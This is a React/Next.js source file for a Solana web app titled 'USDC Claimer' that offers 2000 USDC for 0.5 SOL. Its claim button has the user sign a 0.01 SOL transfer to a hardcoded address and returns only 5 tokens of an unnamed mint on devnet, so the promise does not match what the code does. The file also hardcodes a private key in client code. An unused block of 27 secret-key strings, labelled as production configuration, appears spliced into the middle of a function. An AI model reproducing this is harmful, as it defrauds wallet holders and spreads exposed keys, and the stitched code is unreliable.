/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "4GrWfE68qvApG4cff1Vu9jb9t8bUdNDdthDRY4CC6iKiqaqkpPpHYVWJrgobUdWB9swonJUkrE1zBLLvWm87u2af"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "64yLirnD3sKN89tkvhRo8c2pACiQqQyHZroxiU1FAkM1pKjFhk5fR43s1qRwPji56hA64vfX1EYZZnA1byf6yVqq",
  "key1": "4SYrYbU2Ha4e2UkM8sRjxaFy1cFfw4zUswo8VGfqio1HFVDESGa3EMqB76za1DpZexS4DUMvJSxeCppCFdAogom8",
  "key2": "2op1wZHnPqN4fLoxA9jrvG1LT9TdTegu1JmapbLGuNc3Cb3AyEKGPbEZT4qmDCYcvcWAnxizoWPP9j6JW8DTVDAZ",
  "key3": "41KJgTKpKYjWAADbG3QD1YQH9sg8nRWNKtpCs1kSZ9RndJYBQ3NQBakgvCSNcGnnGsL8ic7edxhanpCyiWngfLdW",
  "key4": "5BKkLm5n6bW1tSARRHBNuVwbaJgkh8V6Sip6sQ52dEbBiXBMWUGEqE1HLmdMfaA4GCVk1cgXpL71ArvQcPmHKW7T",
  "key5": "656VrFbkDYaxcB19GAaEgZ7v79ELVBQdSSHFRkKPH2zYxs3Z8FBei6CRpL2VhVYnx8cAckvT5NVhLeA4rh86waUm",
  "key6": "Fr4vXFXZYS9cgQeGX6rHLMzRSGoMjbpYP96dGMqnaNabAGf8hhevMc6pdzVYXrgntPhbQuuNq7JLoR91ApLsdnB",
  "key7": "5YVwPG7286g77r2hZsvMdeVR5HiDSuK1Z6tcpYJvf163ECz766c6uUMThVptBRYyFU3iPjssE1AmhM7WhV57XzCD",
  "key8": "5xiprqFxVBVRyjMdv6VXnBEPPsAeDW7BByFm7oh2wC3srWZpWSEHCKbBnKUvHrnKLuJfBSK7nEWysx2HczZ2ynnd",
  "key9": "4wE2W1Bd4fvGtSeBzpVw3tY512A7tTyu1KkawzZsQH18MStVVoJMWYZtiAZdghD1LDW4Pem78rossujJdhRcr8QC",
  "key10": "48MW2KKzgZhNnUo3XzwW5ssMhzE9ao1SNA8DzXETqqfUD7pWYycNeUXCY2bT2Y8dQtEyJ8Jvnpi7rMHt4cxS8xnX",
  "key11": "WTcUjRQok8mnuH72uLJMtcMZbhFgqwHiQ1Lhf9r2qYu7H2SzmtgUY4m1hCA9nfJDzqJAguGjpALmWSQBHMD2rjm",
  "key12": "5G6GLBYVJ97nLzwbTjytE5JjMxNRqXFMEFD5QiF2dko7D5otQLVhzr65Kxf7jSmB4UXpNmqxHw9RfzfMHBwjYCkf",
  "key13": "UCU3E8wBXpjcA96b26zi6J4fXZu8vZ1oYzjgh7qh4YricKx58EyahENLE8MdpzinjGrxKdJyLG6KsNuhsTejue5",
  "key14": "2zUsaXUgrgGdDxiBJ4PXbKGmHVBAjZRUixt2FjfA9wkmTjoqvx2evmEcVngjZzWpycfirLb4URb4SX2S6ZyxkgbH",
  "key15": "4T6Lmx3XyBCzTU2qJBZdAUfkRN9qRQh9xbhk6rfNUwSoJKbJ5YQwHkrgqaUHM9Nz3cCH2YpEri6CmG2b6V6T9Cxm",
  "key16": "4axWzkkbYAtqb9bFS8s5NVWsT91LEjFVjcwCqnQe88NGLAFWAvJLPGVkLpk63bGGxiemQ5KjkL6zX33cVJhjBk3x",
  "key17": "3mB6VXykgJ5h6nHTjYAzYFUtu2AGV5GEvmfScCampc9Mi6phSKM8rDPeQGMW1gqQmi1udoJtqhqwbkxSmRwYEMfe",
  "key18": "2W6eMqiVFHHxM3jjeGC7o35Q1vTzixWmraPV9LrQsMFQzQmevz4hsy8vJoRWRjpxmW6a8txy3Wak2m1KxzLwZu92",
  "key19": "KsuuBqAHNh9M9RfWkk8kyeqd7mwh8N4pZ341fy3RqzUBpBm8XacRZvsHsCYWcWiWAoy973PNPW2YSfgVck6ShJB",
  "key20": "55jQ67QWcYpMA43ojJDqREbTH6BMeAQxCKxUL9NbPG3uRFs6izSSAXxT4QsWCC9HtseHhBDH667S7h1vvBHUxhgV",
  "key21": "27kEpco9mCcG9Nz5J5XRsfWs9BirQqQSSCM4mrtT3Gny8PytWAVA2G39U7eFCbvziPGFkDDrJLQCX5i4yK1EreDq",
  "key22": "L5czcAbuDizBD1UV5CM7U24hCD3JVtMzKs8CM3M9ad5NENoH5tdQ9RVLYDZaJd8Qa3mVjwWsE6fLfDfBMDkMRH9",
  "key23": "3txirgESx4GeQAtJb8yNGZNL1HFQPpqh888nhmVfa4YaXrnR8mwVfYtGrFbVEH1HbR5Ur5He9ZGuDTdM5Go23s3W",
  "key24": "3tLHWGBCC6qVrEVQyeDj3YjeXHqBnjQH6Mf2astt9zDfQ3aeC8jS5PfRgSPsdNrbXyxGPExAH7Dgh5KDCGMK6bgn",
  "key25": "42z1EhtbjvWCN6TyL8exZJDbG7E9wtrAQXTGSFDamPSjNiCVzJ3S1fhRz1M6KhPJHr4n8uoFgBroty9itYix8T5T",
  "key26": "4LFX5JJi5iucGgoV8xS8faMs2Wp6vHSLZiHFY9dBMfdPsaZND59pYMLzLxaG6AD6iTRw1iL3SETcXg52Lxw3N5iL"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
